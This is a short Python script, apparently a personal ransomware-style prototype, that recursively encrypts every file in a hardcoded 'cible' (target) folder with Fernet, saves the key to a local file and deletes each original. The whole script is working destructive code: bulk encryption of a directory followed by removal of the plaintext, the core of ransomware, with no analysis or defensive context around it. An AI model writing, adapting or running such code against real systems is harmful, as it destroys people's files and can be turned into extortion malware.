import os
from cryptography.fernet import Fernet

folder = "C:\\Users\\jorda\\OneDrive\\Documents\\cible"


def generate_key():
    key = Fernet.generate_key()
    with open("encrypte.key", "wb") as key_file:
        key_file.write(key)
    return key

def load_key():
    return open("encrypte.key", "rb").read()

def encrypt_file(file, key):
    with open(file, "rb") as f:
        data = f.read()
    
    fernet = Fernet(key)
    encrypt_data = fernet.encrypt(data)
    
    with open(file + ".enc", "wb") as f:
        f.write(encrypt_data)
    os.remove(file)
    
    print(f"File crypted: {file}")
    
def encrypt_all_files(directory, key):
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            if not file.endswith(".enc") and file != "encrypte.key":
                encrypt_file(file_path, key)
                print(f"Encrypted {file_path}")

if __name__ == "__main__":
    key = generate_key()
    encrypt_all_files(folder, key)